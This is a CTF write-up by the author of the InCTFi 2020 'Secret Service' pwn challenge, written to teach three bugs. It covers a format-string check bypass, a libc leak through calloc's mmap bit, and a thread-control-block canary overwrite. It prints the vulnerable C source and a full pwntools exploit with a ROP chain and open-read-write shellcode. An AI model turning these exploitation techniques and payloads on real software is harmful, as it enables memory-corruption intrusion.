---
layout: "post"
title: "InCTFi 2020 Secret Service Writeup"
date: 2020-8-14
tags: [Heap, Format Strings, InCTFi]
---



## tl;dr

+ Use format String to get into secret service.
+ Get libc leaks by overwriting mapped bit of a free chunk.
+ Overwrite the Thread Local Block , thus overwriting canary to get buffer overflow.

**Challenge Points :** 996

**No of Solves :** 4

## Challenge Description


`There is a secret service hidden in the depths of the binary. Get into it,  use/hack it to your own needs and don't forget to leave a feedback :P.`


[Here](https://drive.google.com/file/d/1E4mXspk2zpwOmBj1dVHKu5ibvP9sRx6V/view?usp=sharing) are the Challenge files.

## Analysis Of The Challenge Binary

The binary is standard *x86 64-bit Dynamic stripped* executable. Additionally , **glibc 2.31** , the loader and **libseccomp** has been provided so that there are no heap mismatches later.

Here's the output of checksec - 

```sh
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

```

Here's the seccomp dump.

```python

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1f 0xc000003e  if (A != ARCH_X86_64) goto 0033
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x1c 0xffffffff  if (A != 0xffffffff) goto 0033
 0005: 0x15 0x1a 0x00 0x00000003  if (A == close) goto 0032
 0006: 0x15 0x19 0x00 0x00000005  if (A == fstat) goto 0032
 0007: 0x15 0x18 0x00 0x00000009  if (A == mmap) goto 0032
 0008: 0x15 0x17 0x00 0x0000000a  if (A == mprotect) goto 0032
 0009: 0x15 0x16 0x00 0x0000000b  if (A == munmap) goto 0032
 0010: 0x15 0x15 0x00 0x00000014  if (A == writev) goto 0032
 0011: 0x15 0x14 0x00 0x00000020  if (A == dup) goto 0032
 0012: 0x15 0x13 0x00 0x00000021  if (A == dup2) goto 0032
 0013: 0x15 0x12 0x00 0x00000023  if (A == nanosleep) goto 0032
 0014: 0x15 0x11 0x00 0x00000025  if (A == alarm) goto 0032
 0015: 0x15 0x10 0x00 0x00000038  if (A == clone) goto 0032
 0016: 0x15 0x0f 0x00 0x0000003c  if (A == exit) goto 0032
 0017: 0x15 0x0e 0x00 0x00000048  if (A == fcntl) goto 0032
 0018: 0x15 0x0d 0x00 0x000000e6  if (A == clock_nanosleep) goto 0032
 0019: 0x15 0x0c 0x00 0x000000e7  if (A == exit_group) goto 0032
 0020: 0x15 0x0b 0x00 0x00000101  if (A == openat) goto 0032
 0021: 0x15 0x0a 0x00 0x00000111  if (A == set_robust_list) goto 0032
 0022: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0027
 0023: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0024: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0033
 0025: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0026: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0032 else goto 0033
 0027: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0033
 0028: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0029: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0033
 0030: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0031: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0033
 0032: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0033: 0x06 0x00 0x00 0x00000000  return KILL

```

A few syscalls among openat , read and write have been left open intending for an **orw** shellcode in the end. But , there are seccomp contraints which let you read only from fd **0** and write only to fd **1**. There are simple ways to pass them which we'll see towards the end of this post.

## Reversing And Exploit Development

The binary initially asks for a `name` and an unsigned int `Age`. Before all this , it initially `mmaps` a writeable region and then calls a function which generates a random 2 byte constraint.

```c
void get_rand(long *region)
{
    time_t toc;
    unsigned int tic = time(&toc),end_t;
    do{
    srand(tic/60);
    unsigned int lower = 0x1000 , upper = 0xffff;
    unsigned int rand_num = (rand()%(upper-lower+1)) + lower;
    unsigned int delay = rand()%300 + 1;
    end_t = tic + delay;
    tic = tic + delay;
    srand(end_t/30);
    unsigned int rand_num_2 = (rand()%(upper-lower+1)) + lower;
    memset(region,0,4);
    memcpy(region,&rand_num_2,2);
    *(long *)region &= (unsigned long)rand_num;
    }
    while(*(long *)region<0x1000);
    MProtect(region);
}

```

We create a random 2 byte vulnerable contraint.

Finally the mmaped region is mprotected to be `read-only`. 

Later on , the age is verified with the 2 byte contraint which has to be satisfied by the format string vulnerability.


### An Unintended Flaw

The only thing I forgot to do was add a check to age (< 0x900) , so that only format string can be used to bypass the check to enter the secret service. 

But since I didn't add a check,  the format string is rendered **useless** as participants can directly calculate the age from the library using **ctypes** or plain python and give that as age :(.
{: .notice}

But now I'd like to discuss how you could do it the intended way using format string.

Well , I've included the fixed binary in the handout folder and now u can try the challenges without any unintended flaws :).

### The Intended Way To Get Into The Secret Service

Here's the exploit snippet which mimics the 2 byte contraint.

```python
from pwn import *
import ctypes
from ctypes import *
from time import sleep
import sys

context.arch="amd64"
HOST = '35.245.143.0'
PORT = 7777
LIBC = ELF("./libc.so.6",checksec = False)
libc = ctypes.cdll.LoadLibrary("./libc.so.6")
context.noptrace=True
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
else:
    io=process('./chall')

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)


#Defining functions for various heap operations

def add(idx,size,data):
    sla(">> ",'1')
    sla("Index : ",str(idx))
    sla("size : ",str(size))
    sa("details -> \n",data)

def view(idx):
    sla(">> ",'2')
    sla("Candidate: ",str(idx))

def hack(idx):
    sla(">> ",'2020')
    sla("Candidate: ",str(idx))

def free(idx):
    sla(">> ",'3')
    sla("Candidate: ",str(idx))

def move_on():
    sla(">> ",'4')

#Mimicing the random function implemented by binary to break it
def get_rand():
    toc = c_long()
    tic = libc.time(byref(toc))
    while True:
        libc.srand(tic/60)
        lower = 0x1000
        upper = 0xffff
        rand_num = libc.rand()%(upper-lower+1) + lower
        delay = libc.rand()%300 + 1
        end_time = tic + delay
        tic = tic + delay
        libc.srand(end_time/30)
        rand_num_2 = libc.rand()%(upper-lower+1) + lower
        region = rand_num & rand_num_2
        if(region>0x1000):
            return region

```

Now that we have calculated the age , we need to somehow overwrite the age pointer with this so that we pass the check.

### Triggering The Format String Bug

You can think of directly overwriting the age pointer with the afore calculated random number , but the issue is , I had added checks for directly not allowing numbers greater than `0x900` to be present in the input string.

```c
//%n is allowed in format string , but u cant write large numbers (greater than 0x900) with %n
void check_num(char *p)
{
    while (*p) 
    { 
        if ( isdigit(*p)) 
        {
            long val = strtol(p, &p, 10); 
            if(val>0x900)
            {
                puts("Not allowed");
                Exit();
            }
        } 
        else
            p++;
    }
    return;
}

```

So it only leaves us with the solution of writing the random number on stack and then copying it from there to the age pointer.

We can copy numbers from stack using `%*offset$d`. Let's use it in our exploit.
{: .notice}

```python

if __name__=="__main__":

    region = get_rand()
    log.info("region = " + hex(region))
    #Using format string to pass the initial check , to enter the secret_service
    payload = ('%*18$d' + '%15$n').ljust(16,'a') + p64(region)
    sa("Name: ",payload)
    sla("Age: ","123")
    sleep(1)


```

With this , we satisfy all checks and enter the secret service.

The secret service is pretty much a commonplace menu driven code with `Enroll` , `View` , `Remove` and an extra functionality which I termed as `Hack`. Later on , a feedback is requested which initialises a separate thread to do stuff.

But why so much obfuscation just to take a feedback , there's a reason for that guys, hold your horses.

```c
void secret_service()
{
    
    pthread_t t1;
    while(1)
    {
        unsigned int option = menu();
        switch(option)
        { 
            case 1: Enroll();
            break;
            case 2: View();
            break;
            case 3: Remove();
            break;
            case 4: goto Move_On;
            break;
            case 2020: Hack();
            break;
            case 5: exit(EXIT_SUCCESS);
        }
    }
    Move_On:
    puts("Do u want to leave a feedback for the service?(y/n)");
    scanf("%c",&ch);
    if(!strcmp(&ch,"y"))
    {
        pthread_create(&t1,NULL,thread_entry,NULL);
        pthread_join(t1,NULL);
    }
    else
    {
        puts("Thank you!");
    }
    exit(EXIT_SUCCESS);
}
```

Let's see how we can hack the secret service before getting into the feedback part.

1. The `Enroll` Function

```c
//Enroll with the use of safe calloc
void Enroll()
{
    if(enrolled<=2)
    {
        printf("Enter Enrollment Index : ");
        unsigned int index = getInt(),size; 
        if(is_enrolled[index] || index < 0 || index > 2)
        {
            puts("Invalid or already enrolled!");
            return;
        }
        printf("Enter size : ");
        size = getInt();
        if(size<0x7f || size>=65530)
        {
            puts("Size not allowed!");
            Exit();
        }
        sizes[index] = size;
        puts("Enter your details -> ");
        char *details = (char *)calloc(sizes[index],1);
       // printf("Allocation happened at -> %llx\n",details); Debug info , dont mind
        getInp(details,sizes[index]);
        enrolled_table[index] = details;
        is_enrolled[index] = 1;
        enrolled++;
        puts("Ok! You are enrolled now");
        return;
    }
    else
    {
        puts("No more enrollments allowed!");
    }
}


```

More or less, you can presume that it is safe.


2. The `view` Function

```c
void View()
{
    printf("Enter index of the Enrolled Candidate: ");
    unsigned int index = getInt();
    if(!enrolled_table[index] || !is_enrolled[index] || index<0 || index > 2)
    {
        puts("Invalid Index!");
        return;
    }
    //printf("Viewing chunk %llx\n",enrolled_table[index]);
    printf("Details of Candidate %u: %s\n",index,enrolled_table[index]);
    return;
}

```

There's no use `view-after-free` with all those checks in plain sight.

3. The `Hack` function

```c
void Hack()
{
    if(hacked>1)
    {
        puts("No more hacking allowed!");
        return;
    }
    printf("Enter index of Enrolled Candidate: ");
    unsigned int index = getInt();
    if(!enrolled_table[index] || index<0 || index > 2)      
    {                                  
        puts("Invalid Index!");        
        return;                        
    }
    char* hack_addr = enrolled_table[index] - 8;
    //printf("Hacking chunk %llx\n",hack_addr);
    *(hack_addr) +=1;
    hacked++;
    return;
}

```

Well this function is obviously vulnerable as the name suggests

+ It lets you hack a free chunk.
+ It lets you add **1** to the size of any chunk (free/allocated) but only twice in the whole program.

So what can we do with this? 

If we can add **2** to the size of a free chunk , we end up setting the `mmap-bit` of the free chunk , and thus we can fool calloc to return an uninitialized piece of memory. 
{: .notice}

What this means is that , calloc considers the chunk to be mapped chunk and thus does not call `memset` internally and this sets up our libc leak.

3. The `Remove` function

```c
//Remove function , nulls out the is_enrolled bit , but doesnt null out the table
void Remove()
{
    printf("Enter index of Enrolled Candidate: ");
    unsigned int index = getInt();
    if(!enrolled_table[index] || !is_enrolled[index] || index<0 || index > 2)
    {
        puts("Invalid Index");
        return;
    }
    //printf("Removing chunk %llx\n",enrolled_table[index]);
    if(enrolled_table[index])
        free(enrolled_table[index]);
    is_enrolled[index]=0;
    enrolled--;
    return;
}
```

As you can see , the remove function doesn't null out the table , which lets us `hack` free chunks.

Now let's finish up the exploit until leaking libc.

Getting leaks with this information in hand is nothing but a trivial task.

```python

    #Add 2 chunks ,one of which is uneffected by tcache
    add(0,0x600,'b'*0x40)
    add(1,0x80,'a'*0x40)
    #Free first one to send to unsorted bin
    free(0)
    #Send the unsorted bin to large bin
    add(2,0x1260,'unsorted bin')
    #Flip the bit to make the free chunk mapped , which could be used for leaking with calloc
    hack(0)
    hack(0)
    #Now add that chunk to get uninitialised memory from calloc
    add(0,0xd10,'d'*8) #0x10f0
    #view it to leak stuff
    view(0)
    #Leaks
    io.recvuntil("d"*8)
    libc_base = u64(re(6) + '\x00'*2) - 0x1ec1e0
    log.info("libc_base = "+ hex(libc_base))
    #Done with leaks , move on
```

After getting libc leak , there's not much you can do with the secret service , so , just move on :P.

### The Final Feedback

We have entered the final stage of our program (and exploit too :P) , where we are requested to enter some feedback.

A separate thread is created which calls the thread handler function, `create_feedback`.

```c
void *thread_entry(void *arg)
{
    create_feedback();
    return (void *)NULL;
}

//Create a new thread to handle feedback request
void create_feedback()
{
    char feedback[100];
    puts("A new thread has been created for feedback");
    if((unsigned long)&feedback < init_0())
    {
        printf("Enter size of feedback: ");
        scanf("%d",&size);
        printf("Enter feedback: ");
        if(size>0x70)
        {
            puts("Size too large");
            Exit();
        }
        unsigned int fd_stdout = supress_stdout();
        unsigned int fd_stderr = supress_stderr();
        get_inp(feedback,size);
    }
    puts("Thank you!");
    return;
}

```

There's a plain integer overflow as there is no check for size being less than zero and size is `int`.

But there's a canary , how do we bypass it?

So here's the thing , we are getting write over a region known as `Thread Control Block`. This is the place from where canary is actually loaded into the fs segment register for the stack check fail.
{: .notice}

Now we have plain overflow and we can assume there's no canary , cool isn't it?

Well what next?

### ROP And Shellcode To Grab That Flag

The first thing that comes to mind is , call mprotect on the region we have overflow , and then shellcode.
Well , thats it.

Let's script it till there.

```python
    move_on()
    gdb.attach(io)
    sla("service?(y/n)\n",'y')
    #Trigger integer overflow with type confusion bug to get large write on stack
    sla("feedback: ",'-1')

```

But as you would have noticed , a weird function `supress_stdout` is being called which redirects stdout to `/dev/null`. So how do we get around it? Simple , you just have to mimic it.

Now all we have to do is , write a simple shellcode. 

Wait , one more thing , what about those seccomp constraints which let you read only from fd `0` and write only to fd `1`.

1. To open flag at fd `0` , just close fd 0 and open flag , it will open at fd **0** itself.
2. Now you can read the flag at fd **0** and write it to stdout.


Here's the remaining script.


```python
    #The shellcode first reopens stdout by mimicing the mechanism of supress_stdout function
    #It does so by calling dup2 , changing file descriptor of stdout back to 1
    #Then we close stdin so that flag gets opened at fd 0.
    #After that , we call openat syscall to open flag at fd 0, as open is not allowed
    #Finally we read flag in memory and write it out
    shellcode = asm('''
            xor rdi,rdi
            mov edi,DWORD PTR [rbp-0x88]
            mov rsi,1
            mov rax,33
            syscall
            mov rax,3
            syscall
            mov rax,3
            mov rdi,0
            xor rsi,rsi
            xor rdx,rdx
            syscall
            mov rax,257
            mov rdi,0xffffff9c
            mov r9,0x67616c66
            push r9
            push rsp
            pop rsi
            mov rdx,0
            mov r10,0644
            syscall
            mov rax,0
            mov rdi,0
            lea rsi,[rsp-0x200]
            mov rdx,0x50
            syscall
            mov rax,1
            mov rdi,1
            syscall
            ''')
    #Gadgets
    mprotect = libc_base + LIBC.symbols['mprotect']
    pop_rdi = libc_base + 0x0000000000026b72
    pop_rsi = libc_base + 0x0000000000027529
    pop_rdx_junk = libc_base + 0x00000000001626d6
    mmap_base = libc_base - 0x5000
    log.info("mmap_base = " + hex(mmap_base))
    shellcode_addr = mmap_base + 0xf20
    fflush = libc_base + LIBC.symbols['fflush']
    stdout = libc_base + LIBC.symbols['_IO_2_1_stdout_']
    rbp = libc_base - 0x4130
    #Adding ROP chain for buffer overflow vuln, the idea is to overwrite TCB structure from where the segment register actually takes canary for checking ,thus overwriting the original canary and triggering overflow
    payload = 'a'*0x80 + p64(rbp)
    payload += p64(pop_rdi)
    payload += p64(mmap_base)
    payload += p64(pop_rsi)
    payload += p64(0x10000)
    payload += p64(pop_rdx_junk)
    payload += p64(7)*2
    #We intend to call mprotect to make mmaped region itself executable
    payload += p64(mprotect)
    payload += p64(shellcode_addr)
    payload += shellcode
    payload += 'a'*(0x8e8 - len(payload))
    log.success('Getting flag')
    sla("feedback: ",payload)
    io.interactive()

```

## Conclusion

I have to give credits to `kileak` from [OpenToAll](https://twitter.com/OpenToAllCTF) for pointing out the unintended solution to my challenge , much appreciated.

### Flag

Here's the flag

**FLAG**: `inctf{wh3r3_d1d_y0u_l4nd_up_f1nally_st4ck_H34p_st4ck_0r_H34p_1963290327101999}`

All in all , I had lot of fun making the challenge which was intended to teach the participants about 3 vulnerabilities -

1. Tricky Format String.
2. Leaking memory from calloc.
3. TCB overwrite.

Here's the exploit script [exp.py](https://gist.github.com/PwnVerse/eaec3712c0dfbf136a8ae628cfe2655a)
